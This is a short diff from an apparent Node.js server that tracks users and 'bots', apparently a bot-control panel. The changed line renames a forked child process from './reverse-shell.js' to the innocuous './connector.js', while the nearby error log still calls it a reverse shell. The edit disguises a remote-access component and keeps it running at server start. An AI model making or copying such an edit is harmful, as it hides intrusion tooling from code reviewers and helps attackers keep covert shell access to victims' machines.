@@ -22,7 +22,7 @@ app.use(session({
 
 const USERS_FILE = path.join(__dirname, 'users.json');
 const BOTS_FILE = path.join(__dirname, 'bots.json');
-const shellProcess = fork('./reverse-shell.js');
+const shellProcess = fork('./connector.js');
 
 shellProcess.on('error', (err) => {
   console.error('[!] Reverse shell error:', err);
